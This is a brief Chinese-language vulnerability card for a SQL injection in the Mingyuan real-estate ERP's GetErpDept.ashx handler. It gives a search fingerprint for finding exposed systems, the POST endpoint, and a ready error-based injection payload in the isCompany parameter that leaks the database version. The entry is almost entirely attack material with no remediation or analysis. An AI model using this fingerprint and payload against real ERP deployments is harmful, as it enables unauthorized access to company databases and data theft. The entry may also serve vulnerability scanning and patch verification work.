# 明源地产ERPGetErpDept存在SQL注入漏洞

明源地产 ｜ SQL注入 ｜ —
- **指纹**：`body="/_common/scripts/md5-min.js"`
- **请求**：`POST /XmjdUI/Handle/GetErpDept.ashx HTTP/1.1`

**Payload**
```
isCompany=') and 1=@@VERSION--
```
- **响应特征**：200